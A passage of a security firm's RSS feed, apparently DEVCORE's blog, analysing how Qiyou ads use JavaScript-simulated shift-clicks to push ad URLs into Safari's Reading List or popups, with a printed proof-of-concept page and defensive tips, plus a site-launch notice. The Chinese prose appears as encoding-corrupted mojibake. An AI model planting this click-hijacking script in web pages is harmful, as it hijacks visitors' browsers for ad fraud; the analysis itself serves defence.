&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_05.png&quot; alt=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - Safari é–±è®€åˆ—è¡¨è¢«æ”¾ç½®å»£å‘Š URL&quot; title=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - Safari é–±è®€åˆ—è¡¨è¢«æ”¾ç½®å»£å‘Š URL&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ‰“é–‹é–±è®€åˆ—è¡¨ä¹‹å¾Œï¼Œæˆ‘å€‘èµ«ç„¶ç™¼ç¾è£¡é¢è¢«åŠ äº†éå¸¸å¤šå»£å‘Šçš„é é¢ï¼&lt;/p&gt;

&lt;p&gt;å¯ä»¥çœ‹ä»¥ä¸‹å½±ç‰‡ç¤ºç¯„ï¼š&lt;/p&gt;
&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/E-BGf1MwecU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;é€™æ˜¯æ€éº¼åšåˆ°çš„å‘¢ï¼Ÿå°±æ˜¯ä¸€ç¨®åˆ©ç”¨ JavaScript æ§åˆ¶æ»‘é¼ é»æ“Šçš„è®Šå½¢æ‡‰ç”¨ã€‚é»é¸ã€Œç¶²é æª¢é–±å™¨ã€æˆ–æ˜¯ã€Œé–‹ç™¼è€…å·¥å…·ã€ï¼Œæœƒçœ‹åˆ°ä¸€æ®µå¥‡æ€ªçš„ JavaScript æ§åˆ¶æ»‘é¼ çš„é»æ“Šè¡Œç‚ºã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_06.png&quot; alt=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - å»£å‘Š JavaScript&quot; title=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - å»£å‘Š JavaScript&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åˆ†æç¯€éŒ„å¾Œçš„ code å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;href&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;style&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;display:none;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;MouseEvents&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initMouseEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;click&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dispatchEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// nothing.&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;http://google.com/?&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Test: FORCE_ADD_URL_TO_READINGLIST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;åˆ©ç”¨ã€Œ&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&quot;&gt;initMouseEvent&lt;/a&gt;ã€æ¨¡æ“¬æ»‘é¼ çš„é»æ“Šï¼Œåœ¨ URL ä¸ŠæŒ‰ä¸‹ Shift éµé»æ“Šã€‚åœ¨ä¸€èˆ¬ç€è¦½å™¨ä¸­æ˜¯ã€Œé–‹å•Ÿæ–°è¦–çª—ã€ï¼Œåœ¨ Safari ä¸­å‰‡æ˜¯ã€ŒåŠ å…¥é–±è®€æ¸…å–®ã€äº†ï¼Œå› æ­¤å½¢æˆå»£å‘Šè¦–çª—ä¸æ–·åŠ å…¥é–±è®€æ¸…å–®çš„ç¾è±¡ã€‚å»£å‘Šå•†åˆ©ç”¨é€™ç¨®æ‰‹æ³•å¢åŠ å»£å‘Šçš„é»æ“Šç‡ï¼Œåªè¦ç€è¦½å™¨æ²’æœ‰å®‰è£é˜»æ“‹å»£å‘Šçš„å¥—ä»¶æˆ–è€…æ˜¯é˜»æ“‹ã€Œå½ˆå‡ºå¼è¦–çª—ã€ï¼Œä½ å°±æœƒæˆç‚ºæµé‡çš„è²¢ç»è€…ã€‚&lt;/p&gt;

&lt;p&gt;ç¶“éæˆ‘å€‘çš„æ¸¬è©¦ï¼ŒInternet Explorerã€Mozilla Firefox ä¸æœƒå—é€™é¡æ”»æ“Šå½±éŸ¿ï¼ŒGoogle Chromeã€Opera å‰‡æœƒè¢«å…§å»ºçš„ Pop-up è¦–çª—é˜»æ“‹åŠŸèƒ½æ“‹ä¸‹ã€‚ä½†è‹¥æ˜¯ç›´æ¥æ¨¡æ“¬é»æ“Šï¼Œå‰‡å…¨æ•¸ç€è¦½å™¨éƒ½æœƒå—å½±éŸ¿å°å‘è‡³ URLã€‚é›–ç„¶é€™ç¨®é¡å‹çš„æ”»æ“Šä¸æœƒé€ æˆå¯¦è³ªä¸Šçš„æå¤±è·Ÿå±å®³ï¼Œä½†è‹¥æ˜¯çµåˆå…¶ä»–æƒ¡æ„æ‰‹æ³•å°‡å¯ä»¥é€ æˆæ”»æ“Šã€‚ä¾‹å¦‚é€éç¶²ç«™æ›ç¢¼å°‡ä½¿ç”¨è€…å°å‘è‡³æƒ¡æ„ç¶²ç«™ç­‰ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;è‹¥è¦é¿å…æ­¤é¡å‹æ”»æ“Šï¼Œæœ‰ä»¥ä¸‹å¹¾å€‹å»ºè­°æ–¹æ¡ˆï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å®‰è£ NoScript é¡å‹å¥—ä»¶ï¼Œåƒ…å…è¨±å¯ä¿¡è³´çš„ç¶²ç«™åŸ·è¡Œ JavaScript&lt;/li&gt;
  &lt;li&gt;é–‹å•Ÿã€Œå½ˆå‡ºå¼è¦–çª—ã€é˜»æ“‹åŠŸèƒ½ï¼Œä¸¦å°‡ç¶²ç«™å®‰å…¨æ€§ç­‰ç´šæé«˜ã€‚&lt;/li&gt;
  &lt;li&gt;å®‰è£ AdBlock ç­‰å»£å‘Šé˜»æ“‹å¥—ä»¶ï¼ˆä½†æœƒå½±éŸ¿ç¶²ç«™ç‡Ÿæ”¶ï¼‰&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬ç€è¦½å™¨ä»¥ç­–å®‰å…¨&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ç¶²é å‹çš„æ”»æ“Šè¶Šä¾†è¶Šå¤šæ¨£åŒ–ï¼Œé™¤äº†ä¾è³´ç€è¦½å™¨æœ¬èº«çš„ä¿è­·ä¸¦è¼”ä»¥ç¬¬ä¸‰æ–¹å®‰å…¨å¥—ä»¶ä¹‹å¤–ï¼Œæ›´éœ€è¦ä½¿ç”¨è€…æœ¬èº«çš„å®‰å…¨æ„è­˜ï¼Œæ‰èƒ½å®‰å¿ƒæš¢å¿«çš„ç€è¦½ç¶²è·¯ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking/</link>
                <guid>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking</guid>
                <pubDate>Thu, 06 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE æ–°ç¶²ç«™ä¸Šç·šï¼</title>
                <description>&lt;p&gt;DEVCORE çš„æ–°ç¶²ç«™ä¸Šç·šäº†ï¼&lt;br /&gt;&lt;br /&gt;
éå¸¸æ„Ÿè¬å°ˆæ¥­çš„ &lt;a href=&quot;http://evendesign.tw/&quot;&gt;EVENDESIGN&lt;/a&gt; å¹«æˆ‘å€‘è¨­è¨ˆç²¾ç¾çš„ç¶²ç«™ï¼&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ç›®å‰ä¸»è¦æœå‹™é …ç›®ç‚ºæ»²é€æ¸¬è©¦ã€è³‡å®‰æ•™è‚²è¨“ç·´ã€è³‡å®‰äº‹ä»¶è™•ç†ã€è³‡å®‰é¡§å•æœå‹™ï¼Œ&lt;br /&gt;&lt;br /&gt;
å„é …æœå‹™çš„è©³ç´°å…§å®¹å¯åƒè€ƒ &lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;Services&lt;/a&gt; é é¢ã€‚&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;åŒæ™‚ï¼Œåœ¨å®˜ç¶²ä¸­æˆ‘å€‘å°‡æœƒä¸å®šæœŸæä¾›æœ€æ–°çš„è³‡å®‰æ–°çŸ¥åŠæŠ€è¡“æ–‡ç« ï¼Œ&lt;br /&gt;&lt;br /&gt;
å¸Œæœ›è—‰ç”±æˆ‘å€‘çš„åŠ›é‡è®“å¤§çœ¾æ›´æ¸…æ¥šè³‡è¨Šå®‰å…¨çš„é‡è¦ã€‚&lt;br /&gt;&lt;br /&gt;
ä¸¦ä¸”é€éç«™å…§çš„æ•™å­¸æ–‡ç»ï¼Œè®“é–‹ç™¼è€…ã€ç®¡ç†è€…é€²ä¸€æ­¥äº†è§£é§­å®¢çš„æ€ç¶­ã€æ”»é˜²çš„æ‰‹æ³•ï¼Œ&lt;br /&gt;&lt;br /&gt;
çŸ¥å·±çŸ¥å½¼ï¼Œæ‰èƒ½ç™¾æˆ°ä¸æ€ ã€‚ç­è§£å¦‚ä½•æ”»æ“Šï¼Œæ›´èƒ½çŸ¥é“å¦‚ä½•é˜²ç¦¦ã€‚&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;è‹¥å°æˆ‘å€‘çš„ç¶²ç«™å…§å®¹æˆ–æœå‹™æœ‰ä»»ä½•å»ºè­°ï¼Œæ­¡è¿æ‚¨éš¨æ™‚èˆ‡æˆ‘å€‘è¯ç¹«ã€‚&lt;br /&gt;&lt;br /&gt;
å¸Œæœ›æˆ‘å€‘èƒ½ç‚ºæ‚¨çš„ä¼æ¥­è³‡è¨Šå®‰å…¨æœ€ä½³æŠŠé—œè€…ï¼&lt;br /&gt;&lt;br /&gt;
æ­¡è¿éš¨æ™‚è¯çµ¡æˆ‘å€‘ï¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;contact [at] devco.re&lt;/code&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/02/27/devcore-new-website/</link>
                <guid>https://devco.re/blog/2014/02/27/devcore-new-website</guid>
                <pubDate>Thu, 27 Feb 2014 00:00:00 +0800</pubDate>
        </item>


</channel>
</rss>
